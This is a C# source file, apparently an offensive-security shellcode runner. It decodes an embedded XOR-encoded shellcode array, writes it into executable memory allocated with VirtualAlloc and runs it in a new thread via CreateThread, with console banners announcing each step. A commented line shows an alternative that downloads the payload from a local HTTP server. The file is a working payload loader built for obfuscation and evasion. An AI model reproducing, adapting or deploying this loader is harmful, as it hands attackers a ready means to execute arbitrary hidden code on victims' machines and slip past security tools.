using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Data;
namespace ShellCodeRunnerXOR
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);




        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);


        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        static Byte[] XORDecrypter_2(Byte[] EncShellCode, Byte Key)
        {
            byte[] DeccryptedShellCode = new byte[EncShellCode.Length];
            for (int i = 0; i < EncShellCode.Length; i++)
            {
                DeccryptedShellCode[i] = (Byte)(((uint)EncShellCode[i] - Key) & 0xff);
            }
            return DeccryptedShellCode;
        }




        static void Main(string[] args)
        {




            //Decryption:
            byte[] shell_calce_cipher = { 0x8a, 0xd6, 0x11, 0x72, 0x7e, 0x76, 0x4e, 0x8e, 0x8e, 0x8e, 0xcf, 0xdf, 0xcf, 0xde, 0xe0, 0xdf, 0xe4, 0xd6, 0xbf, 0x60, 0xf3, 0xd6, 0x19, 0xe0, 0xee, 0xd6, 0x19, 0xe0, 0xa6, 0xd6, 0x19, 0xe0, 0xae, 0xd6, 0x19, 0x00, 0xde, 0xd6, 0x9d, 0x45, 0xd8, 0xd8, 0xdb, 0xbf, 0x57, 0xd6, 0xbf, 0x4e, 0x3a, 0xca, 0xef, 0x0a, 0x90, 0xba, 0xae, 0xcf, 0x4f, 0x57, 0x9b, 0xcf, 0x8f, 0x4f, 0x70, 0x7b, 0xe0, 0xcf, 0xdf, 0xd6, 0x19, 0xe0, 0xae, 0x19, 0xd0, 0xca, 0xd6, 0x8f, 0x5e, 0x19, 0x0e, 0x16, 0x8e, 0x8e, 0x8e, 0xd6, 0x13, 0x4e, 0x02, 0xf5, 0xd6, 0x8f, 0x5e, 0xde, 0x19, 0xd6, 0xa6, 0xd2, 0x19, 0xce, 0xae, 0xd7, 0x8f, 0x5e, 0x71, 0xe4, 0xd6, 0x8d, 0x57, 0xcf, 0x19, 0xc2, 0x16, 0xd6, 0x8f, 0x64, 0xdb, 0xbf, 0x57, 0xd6, 0xbf, 0x4e, 0x3a, 0xcf, 0x4f, 0x57, 0x9b, 0xcf, 0x8f, 0x4f, 0xc6, 0x6e, 0x03, 0x7f, 0xda, 0x91, 0xda, 0xb2, 0x96, 0xd3, 0xc7, 0x5f, 0x03, 0x66, 0xe6, 0xd2, 0x19, 0xce, 0xb2, 0xd7, 0x8f, 0x5e, 0xf4, 0xcf, 0x19, 0x9a, 0xd6, 0xd2, 0x19, 0xce, 0xaa, 0xd7, 0x8f, 0x5e, 0xcf, 0x19, 0x92, 0x16, 0xd6, 0x8f, 0x5e, 0xcf, 0xe6, 0xcf, 0xe6, 0xec, 0xe7, 0xe8, 0xcf, 0xe6, 0xcf, 0xe7, 0xcf, 0xe8, 0xd6, 0x11, 0x7a, 0xae, 0xcf, 0xe0, 0x8d, 0x6e, 0xe6, 0xcf, 0xe7, 0xe8, 0xd6, 0x19, 0xa0, 0x77, 0xe5, 0x8d, 0x8d, 0x8d, 0xeb, 0xd6, 0x48, 0x8f, 0x8e, 0x8e, 0x8e, 0x8e, 0x8e, 0x8e, 0x8e, 0xd6, 0x1b, 0x1b, 0x8f, 0x8f, 0x8e, 0x8e, 0xcf, 0x48, 0xbf, 0x19, 0xfd, 0x15, 0x8d, 0x63, 0x49, 0x7e, 0x43, 0x30, 0xe4, 0xcf, 0x48, 0x34, 0x23, 0x4b, 0x2b, 0x8d, 0x63, 0xd6, 0x11, 0x52, 0xb6, 0xca, 0x94, 0x0a, 0x98, 0x0e, 0x89, 0x6e, 0x03, 0x93, 0x49, 0xd5, 0xa1, 0x00, 0xfd, 0xf8, 0x8e, 0xe7, 0xcf, 0x17, 0x68, 0x8d, 0x63, 0xf1, 0xef, 0xfa, 0xf1, 0xbc, 0xf3, 0x06, 0xf3, 0x8e };
            //==Note==
            // Byte[] shellcodeBytes = new System.Net.WebClient().DownloadData("http://127.0.0.1:2100/FILE.bin");

            Byte key = 0x8E;
            Byte[] shellcodeBytes = XORDecrypter_2(shell_calce_cipher, key);
            // Injection

            Console.WriteLine("[+]     ====Decrypting ShellCode===     [+]");
            Console.WriteLine("{ ");
            foreach (byte sh in shellcodeBytes) { Console.Write("0x" + sh.ToString("X") + ","); }

            Console.WriteLine("}");
            Console.WriteLine("\n");

            Console.WriteLine("[+]     ====Allocate Memory to store  ShellCode===     [+]");

            IntPtr ShellCodeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcodeBytes.Length, 0x1000, 0x40);

            //Execute and Get Returned Value in Same step  (We will use this value) 
            Console.WriteLine("     [Alllocation Done Succefully in " + "0x"+ShellCodeAddr.ToString("X")+"]");
            Console.WriteLine("\n");


            Console.WriteLine("[+]     ====Moving ShellCode to Execution===     [+]");

            Marshal.Copy(shellcodeBytes, 0, ShellCodeAddr, shellcodeBytes.Length);

            Console.WriteLine("     [Bing00!!! Moving Done Succefully And Shell Code Ready For Execution!!!!] " );

            Console.WriteLine("\n");



            IntPtr handleforshell = CreateThread(IntPtr.Zero, 0, ShellCodeAddr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine("All Work is Done!!!!\n[+]     ====Starting Execution in  Created thread "+ handleforshell + " ===   [+]");


            // Lastly we will use WaitForSingleObject to make our thread wait for infinite number of time.
            WaitForSingleObject(handleforshell, 0xFFFFFFFF);


            }
        }
    }





  